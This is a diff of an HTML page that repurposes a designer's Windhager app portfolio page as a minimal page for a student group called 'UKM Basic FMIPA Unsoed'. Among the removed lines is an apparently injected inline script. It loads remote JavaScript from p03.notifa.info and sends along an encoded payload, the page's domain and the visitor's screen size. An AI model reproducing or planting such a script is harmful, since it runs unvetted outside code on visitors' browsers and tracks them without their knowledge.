@@ -1,28 +1,21 @@
-
 <!doctype html>
-<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
-<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
-<!--[if IE 8]><html class="no-js lt-ie9" lang="en"> <![endif]-->
-<!--[if IE 9 ]><html class="ie9 no-js"> <![endif]-->
-<!--[if (gt IE 9)|!(IE)]><!--> <html class="no-js"> <!--<![endif]--><html>
 	<head>
-		<title>Melanie Daveid - UX Design & Art Direction</title>
+		<title>UKM Basic FMIPA Unsoed</title>
 
 		<!-- META DATA -->
 		<meta http-equiv="content-type" content="text/html; charset=utf-8">
 		<meta name="description" content=""/>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"/>
 
-		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
-		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+		<link rel="shortcut icon" href="./assets/img/logo_basic.png" />
 
 		<!-- CSS -->
 		<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
-		<link type="text/css" rel="stylesheet" href="./assets/css/styles.min.css?v=1.7" />
+		<link type="text/css" rel="stylesheet" href="./styles.css" />
 
 		<!-- JAVASCRIPT -->
-		<script type="text/javascript" src="./assets/js/respond.min.js"></script>
-		<script type="text/javascript" src="./assets/js/modernizr.min.js"></script>
+		<script type="text/javascript" src="./respond.js"></script>
+		<script type="text/javascript" src="./modernizr.js"></script>
 
 	</head>
 	<body class="loading">
@@ -31,79 +24,13 @@
 				<div class="row">
 					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
 						<p class="text-align--s-left">
-							Windhager, one of the leading boiler manufacturers world wide, entered the mobile market for heating-control applications with their product myComfort. 
+							TOEFL. 
 						</p>
 						<p class="text-align--s-left">
-							An easy-to-use app that enables people to have full control of their heating system at any time and everywhere.
+							Basic FMIPA Unsoed.
 						</p>
 					</div>
 				</div>
-				<div class="row" style="background-color: #efefef;">
-					<div class="column--s-12">
-						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
-							<h4 class="subtitled">UI & Interactions</h4>
-							<h6 class="text-color--red proxima-nova-bold uppercase">iOS App</h6>
-						</div>
-						<img src="./assets/img/content/windhager/01-windhager.jpg" class="responsive" alt="">
-						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
-						<img src="./assets/img/content/windhager/02-windhager.jpg" class="responsive" alt="">
-						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
-					</div>
-				</div>
-
-
-				
-				<div class="row" style="background-color: #e74342;">
-					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
-						<h4 class="proxima-nova-bold" style="color: #fff">Intuitive Handling</h4>
-						<p style="color: #fff">
-							The heating process can be regulated with intuitive touch gestures like drag, swipe or slide which are consistently used throughout the app to keep the learning curve of the potential target audience low and to avoid frustration. 
-						</p>
-						<p style="color: #fff">
-							In addition to the myComfort app, users will be able to check the status of their system on an online platform. This service makes real time communication between user, heating system and service team possible. 
-						</p>
-					</div>
-				</div>
-
-				<div class="row" style="background-color: #efefef;">
-					<div class="column--s-12">
-						<img src="./assets/img/content/windhager/03-windhager.jpg" class="responsive" alt="">
-					</div>
-				</div>
-
-				<div class="row" style="background-color: #e74342;">
-					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
-						<h4 class="proxima-nova-bold" style="color: #fff">Online Platform & Service Backend</h4>
-						<p style="color: #fff">
-							The service backend which contained the set-up process of the heating system was a very challenging assignment. 
-						</p>
-						<p style="color: #fff">
-							After structuring the various interaction options with user journeys, the technical part had to be added which required a close collaboration with the development team. These steps were followed by wireframes which built the groundwork for discussions and prototypes. 
-						</p>
-						<p style="color: #fff">
-							Beautiful interactions and animations garnish the product page that introduces the app to potential new customers and gives detailed information about the features and needed setup. 
-						</p>
-					</div>
-				</div>
-
-				<div class="row" style="background-color: #efefef;">
-					<div class="column--s-12">
-						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
-							<h4 class="subtitled">UI & Interactions</h4>
-							<h6 class="text-color--red proxima-nova-bold uppercase">Product Page</h6>
-						</div>
-						<img src="./assets/img/content/windhager/04-windhager.jpg" class="responsive" alt="">
-						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
-					</div>
-				</div>
-
-				<div>
-					<div class="column--s-12 padding--s-4 text-align--s-center" style="background-color: #efefef;">
-						<p class="subtitled" style="font-size: 11px;">Client: Windhager</p>
-						<p class="subtitled" style="font-size: 11px;">Agency: LOOP New Media</p>
-					</div>
-				</div>
-				
 				
 				<div class="row background-color--white text-align--s-center">
 					<div class="column--s-12 column--m-8 column-offset--m-2 padding--s-3 padding--m-6">
@@ -130,6 +57,6 @@
 		<script src="./assets/js/scripts.min.js"></script>
 
 
-	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xeHgH3f4AqajbjEnKZvyCzROPC3Io95Y6oxtn2O0TOiBnsFjdc9CvJbKYVKtd96lnB3msFC3UQqLzqxBnKY4D%2fBxcHS4g1ZqdK%2fQ8uEzkP6FM13uhdGA%2b3VtejgJmeS4jln6bTGSvOH3Dytn2CD7bPmgDXlO8N0PrYeG7qvPisnUTLnSNHeF%2fMhsr1rRd24g2caD%2bVS6918w1G1AIVIko5xY%2boA53B8kDzQUMzC%2fWLmqupymoqWOXy7%2bZvuKFCH%2f6yIl5mZXK3JYu0QFWt%2b1KoQNshMvV%2bpCJiKg3JI9ZiYkqe67nRImF4Oqrt94YadZfjOCZ09WeZClSTbfGCcCuvmxWFPqyMrlN3hDG9e%2bTMuX7rbgTUHKKtQJmNJcO1X0qqRBKQPaxp8%2fD2hxsv1f3SPPRGSJv6a%2bPAjtty%2blQZkdhyPjYjTo280x21TS9yxIv%2br%2bfhzJe9FNxVZz7JgUTX8sLVTCSOPWl5%2bNxuGnTU%2ffpk7q0ppXlcEOZov8x4xUVd7kPpQyb1iUfYHJwj%2biMZdGzyQ3kFz%2fkcqm2pSJqqW3WcaEBnsRyg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+	</body>
 
 </html>
